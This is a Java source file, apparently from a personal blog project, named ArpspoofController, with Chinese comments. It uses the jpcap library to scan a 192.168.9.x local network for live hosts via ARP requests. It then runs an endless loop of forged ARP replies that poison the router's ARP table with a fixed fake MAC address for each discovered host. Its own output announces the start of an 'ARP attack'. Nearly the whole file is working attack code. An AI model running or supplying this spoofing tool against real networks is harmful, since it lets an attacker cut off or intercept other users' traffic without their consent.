package top.lemonz.blog.controller;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * Created by IntelliJ IDEA.
 *
 * @author NingZe
 * description:
 * path: LEMONBLOG-top.lemonz.blog.controller-ArpspoofController
 * date: 2019/12/18 0018 16:16
 * version: 02.06
 * To change this template use File | Settings | File Templates.
 */
public class ArpspoofController {

    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Long l1 = System.currentTimeMillis();
        HashMap<String, String> map = new ArpspoofController().GetAllMacAddress();
        Long l2 = System.currentTimeMillis();
        System.err.println(((l2 - l1) / 1000) + " 秒.");
        for (Map.Entry keys: map.entrySet()) {
            System.err.println(keys.getKey() + "  " + keys.getValue());
        }
        //ArpspoofController.SendArp(map);
    }

    /**
     * 保存IP-Mac对
     */
    private static HashMap<String, String> map = new HashMap<>();

    /**
     * 构造MAC地址byte数组
     */
    public static byte[] stomac(String s) {
        byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
        String[] s1 = s.split("-");
        for (int x = 0; x < s1.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
        }

        return mac;
    }

    /**
     * 发送ARP函数
     */
    public static void SendArp(HashMap<String, String> map) throws Exception {
        /*
         * 枚举网卡并打开设备
         * 检查本机当前使用的哪个网卡  是走的本地连接还是无线网络连接
         * 设置错误会导致ARP请求不会发出去 但检测不到异常
         */
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        NetworkInterface device = devices[1];
        JpcapSender sender = JpcapSender.openDevice(device);
        while (true) {
            for (Map.Entry<String, String> entry : map.entrySet()) {
                String ip = entry.getKey();
                /*
                 * JAVA字符串的比较  ==比较的是两个字符串的引用 涉及到class文件的二进制名称和类加载器
                 * equal的比较才是比较内容
                 */
                if (ip.equals("192.168.9.1")) {
                    continue;
                }

                //// 篡改被攻击主机MAC地址 伪造的MAC地址必须是路由ARP记录里有的MAC地址，否则不会对主机产生影响
                InetAddress srcip = InetAddress.getByName(ip);
                byte[] srcmac = stomac("00-E0-4C-12-5E-A3");

                //// 让路由器被欺骗 
                InetAddress desip = InetAddress.getByName("192.168.9.1");
                byte[] desmac = stomac("54-75-95-E8-3E-0E");

                // 设置ARP包  
                ARPPacket arp = new ARPPacket();
                arp.hardtype = ARPPacket.HARDTYPE_ETHER;
                arp.prototype = ARPPacket.PROTOTYPE_IP;

                //// ARPPacket.ARP_REPLY用于接受MAC地址
                arp.operation = ARPPacket.ARP_REPLY;
                arp.hlen = 6;
                arp.plen = 4;
                arp.sender_hardaddr = srcmac;
                arp.sender_protoaddr = srcip.getAddress();
                arp.target_hardaddr = desmac;
                arp.target_protoaddr = desip.getAddress();

                //// 设置DLC帧  
                EthernetPacket ether = new EthernetPacket();
                ether.frametype = EthernetPacket.ETHERTYPE_ARP;
                ether.src_mac = srcmac;
                ether.dst_mac = desmac;
                arp.datalink = ether;
                System.out.println("Send Arp To IPAddr: " + ip);
                sender.sendPacket(arp);
            }
        }
    }

    /**
     * 构造ARP请求
     */
    private ARPPacket constractRequestArp(NetworkInterface device, String IP) throws UnknownHostException {
        //// 索引0对应IPV6地址  索引1对应IPV4地址
        byte[] broadcast = stomac("ff-ff-ff-ff-ff-ff");
        InetAddress srcip = device.addresses[1].address;

        //// 设置需要向其发送ARP请求的主机IP
        InetAddress desip = InetAddress.getByName(IP);
        ARPPacket arpPacket = new ARPPacket();
        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;

        //// ARP_REQUEST用于请求目标主机的MAC地址 
        arpPacket.operation = ARPPacket.ARP_REQUEST;
        arpPacket.hlen = 6;
        arpPacket.plen = 4;
        arpPacket.sender_hardaddr = device.mac_address;
        arpPacket.sender_protoaddr = srcip.getAddress();
        arpPacket.target_hardaddr = broadcast;
        arpPacket.target_protoaddr = desip.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = device.mac_address;
        ether.dst_mac = broadcast;
        arpPacket.datalink = ether;
        return arpPacket;
    }

    /**
     * 构造ARP请求
     */
    private ARPPacket constractRequestArps(NetworkInterface device, String IP) throws UnknownHostException {
        //// 索引0对应IPV6地址  索引1对应IPV4地址
        byte[] broadcast = stomac("ff-ff-ff-ff-ff-ff");
        InetAddress srcip = device.addresses[1].address;

        //// 设置需要向其发送ARP请求的主机IP
        InetAddress desip = InetAddress.getByName(IP);
        ARPPacket arpPacket = new ARPPacket();
        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;

        //// ARP_REQUEST用于请求目标主机的MAC地址
        arpPacket.operation = ARPPacket.ARP_REQUEST;
        arpPacket.hlen = 6;
        arpPacket.plen = 4;
        arpPacket.sender_hardaddr = device.mac_address;
        arpPacket.sender_protoaddr = srcip.getAddress();
        arpPacket.target_hardaddr = broadcast;
        arpPacket.target_protoaddr = desip.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = device.mac_address;
        ether.dst_mac = broadcast;
        arpPacket.datalink = ether;

        return arpPacket;
    }

    /**
     * 扫描所有存活主机的IP-Mac地址对
     */
    public HashMap<String, String> GetAllMacAddress() throws Exception {
        /*
         * 枚举网卡并打开设备
         * 检查本机当前使用的哪个网卡  设置错误会导致ARP请求不会发出去 但检测不到异常
         */
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        NetworkInterface device = devices[1];

        //// 开启网络接口
        JpcapCaptor captor = JpcapCaptor.openDevice(device, 2000, false, 3000);
        captor.setFilter("arp", true);
        JpcapSender sender = captor.getJpcapSenderInstance();
        ArrayList<String> list = new ArrayList<>();
        for (int i = 1; i < 256; i++) {
            list.add("192.168.9." + i);
        }
        Iterator<String> iterator = list.iterator();
        System.out.println("开始扫描当前局域网所有存活主机，整个过程预计需要2分钟");
        while (true) {
            if (iterator.hasNext()) {
                ARPPacket arpPacket = constractRequestArp(device, iterator.next());
                sender.sendPacket(arpPacket);
            } else {
                System.out.println("");
                System.out.println("ARP扫描完成，5秒后开始ARP攻击");
                Thread.sleep(5000);
                return map;
            }

            //// 监听所有捕获到的数据包
            ARPPacket p = (ARPPacket) captor.getPacket();
            if (p == null) {
                System.out.println("未获取到返回ARP信息");
            } else {
                /*
                 * 按照ARP协议的定义，请求目标主机的MAC地址，需要向本局域网内的所有主机广播ARP请求
                 * 挡目标主机监听到此请求
                 * 其会向请求发送方定向的回应自己的MAC地址
                 * 所以我只需要获取响应信息
                 */
                if (p.operation != ARPPacket.ARP_REPLY) {
                    continue;
                }

                //// 将byte[]数组解析为标志IP地址
                StringBuilder str = new StringBuilder();
                for (byte part : p.sender_protoaddr) {
                    String hex = (part & 0xff) < 0 ? String.valueOf(part & 0xff + 256) : String.valueOf(part & 0xff);
                    str.append(hex);
                    str.append('.');
                }

                String ip = str.toString().substring(0, str.length() - 1);

                /*
                 * 判断目标主机是否存活
                 * 有两种情况会返回MAC地址为00-00-00-00-00-00
                 * 1.目标IP上不存在存活主机
                 * 2.目标主机已做静态绑定 对于静态绑定的主机是无法向路由器篡改其MAC地址的
                 */
                boolean isAlive = false;
                byte[] deadMac = stomac("00-00-00-00-00-00");
                if (!(p.target_hardaddr[0] == deadMac[0]
                        && p.target_hardaddr[1] == deadMac[1]
                        && p.target_hardaddr[2] == deadMac[2]
                        && p.target_hardaddr[3] == deadMac[3]
                        && p.target_hardaddr[4] == deadMac[4]
                        && p.target_hardaddr[5] == deadMac[5])) {
                    isAlive = true;
                }

                System.out.println("响应主机IP: " + ip);
                if (!isAlive) {
                    System.out.println("目标主机未存活");
                    continue;
                }

                //// 保存可用的目标主机IP-MAC对
                if (!map.containsKey(ip)) {
                    str = new StringBuilder();

                    //// 解析ARP响应方MAC地址
                    for (byte part : p.sender_hardaddr) {
                        String hex = Integer.toHexString(part & 0xff).toUpperCase();
                        str.append(hex.length() == 1 ? "0" + hex : hex);
                        str.append('-');
                    }

                    String mac = str.toString().substring(0, 17);
                    System.out.println("当前扫描存活主机MAC地址：" + mac);
                    map.put(ip, mac);
                } else {
                    System.out.println("当前扫描IP记录已存在，进入下一轮");
                    continue;
                }

                for (Map.Entry<String, String> entry : map.entrySet()) {
                    System.out.println("IP-> " + entry.getKey() + "," + "   " + "MAC-> " + entry.getValue());
                }

                System.out.println("本轮结束，当前map保存对象个数:" + map.size());
            }
        }
    }

}


